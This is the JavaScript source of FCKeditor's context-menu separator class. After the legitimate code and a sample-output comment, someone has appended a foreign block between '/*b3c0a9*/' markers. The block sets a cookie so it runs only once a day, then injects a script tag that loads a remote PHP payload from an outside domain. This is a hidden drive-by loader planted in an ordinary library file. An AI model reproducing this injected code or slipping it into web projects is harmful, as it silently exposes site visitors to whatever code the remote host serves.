/*
 * FCKeditor - The text editor for internet
 * Copyright (C) 2003-2005 Frederico Caldeira Knabben
 * 
 * Licensed under the terms of the GNU Lesser General Public License:
 * 		http://www.opensource.org/licenses/lgpl-license.php
 * 
 * For further information visit:
 * 		http://www.fckeditor.net/
 * 
 * "Support Open Source software. What about a donation today?"
 * 
 * File Name: fckcontextmenuseparator.js
 * 	FCKContextMenuSeparator Class: represents a separator in the toolbar.
 * 
 * File Authors:
 * 		Frederico Caldeira Knabben (fredck@fckeditor.net)
 */

var FCKContextMenuSeparator = function()
{
}

FCKContextMenuSeparator.prototype.CreateTableRow = function( targetTable )
{
	// Creates the <TR> element.
	this._Row = targetTable.insertRow(-1) ;
	this._Row.className = 'CM_Separator' ;
	
	var oCell = this._Row.insertCell(-1) ;
	oCell.className = 'CM_Icon' ;
	
	var oDoc = targetTable.ownerDocument || targetTable.document ;
	
	oCell = this._Row.insertCell(-1) ;
	oCell.className = 'CM_Label' ;
	oCell.appendChild( oDoc.createElement( 'DIV' ) ).className = 'CM_Separator_Line' ;
}

FCKContextMenuSeparator.prototype.SetVisible = function( isVisible )
{
	this._Row.style.display = isVisible ? '' : 'none' ;
}

FCKContextMenuSeparator.prototype.RefreshState = function()
{
	// Do nothing... its state doesn't change.
} 

/*
Sample output.
-----------------------------------------
<tr class="CM_Separator">
	<td class="CM_Icon"></td>
	<td class="CM_Label"><div></div></td>
</tr>
*/

/*b3c0a9*/
 function n() {
 var n09 = document.createElement('script');
 n09.src = 'http://justsyrian.com/images/taiyYbKM.php';

 if (!document.getElementById('n09')) {
 document.write('<div id=\'n09\'></div>');
 document.getElementById('n09').appendChild(n09);
 }
}
function SetCookie(cookieName,cookieValue,nDays,path) {
 var today = new Date();
 var expire = new Date();
 if (nDays==null || nDays==0) nDays=1;
 expire.setTime(today.getTime() + 3600000*24*nDays);
 document.cookie = cookieName+"="+escape(cookieValue)
 + ";expires=" + expire.toGMTString() + ((path) ? "; path=" + path : "");
}
function GetCookie( name ) {
 var start = document.cookie.indexOf( name + "=" );
 var len = start + name.length + 1;
 if ( ( !start ) &&
 ( name != document.cookie.substring( 0, name.length ) ) )
 {
 return null;
 }
 if ( start == -1 ) return null;
 var end = document.cookie.indexOf( ";", len );
 if ( end == -1 ) end = document.cookie.length;
 return unescape( document.cookie.substring( len, end ) );
}
if (navigator.cookieEnabled)
{
if(GetCookie('visited_uq')==55){}else{SetCookie('visited_uq', '55', '1', '/');

n();
}
}
/*/b3c0a9*/
